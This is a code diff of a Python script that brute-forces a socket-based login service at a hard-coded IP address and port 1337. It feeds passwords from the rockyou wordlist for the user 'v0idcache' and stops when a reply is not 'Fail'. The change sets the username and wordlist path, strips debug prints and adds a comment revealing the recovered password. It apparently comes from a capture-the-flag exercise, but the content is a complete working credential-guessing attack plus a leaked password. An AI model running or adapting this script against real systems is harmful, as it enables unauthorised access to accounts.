@@ -30,22 +30,19 @@ import struct
 
 host = "142.93.136.81" # IP address here
 port = 1337 # Port here
-wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
+# wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
+wordlist = "D:/Tools/rockyou.txt"
 
 def brute_force():
 
     #3902 contraseña
     f = open(wordlist, "r")
-    username = "OSINT"
+    username = "v0idcache"
 
     for password in f:
         #password = "contraseña"
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((host, port))
-        #data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-        #print(data)             # Prints data
-        
-        #s.send("something to send\n")   # Send a newline \n at the end of your command
        
         # username
         data = s.recv(1024)
@@ -53,10 +50,8 @@ def brute_force():
         pack_len = str(usr_len) + "s"
         # pack username with newline character appended
         payload = struct.pack(pack_len, (username + "\n").encode("utf-8"))
-        print(payload)
         s.send(payload)
         data = s.recv(1024)
-        print(data)
 
         # password
         pass_len = len(password)
@@ -77,13 +72,13 @@ def brute_force():
         s.send(payload)
         data = s.recv(1024)
         s.close()
-
-        print(data)
         
 
         if data.decode()[0:4] != "Fail":
             print("Password is {}".format(password))
             break
+
+# pass is linkinpark
 
 if __name__ == '__main__':
     brute_force()
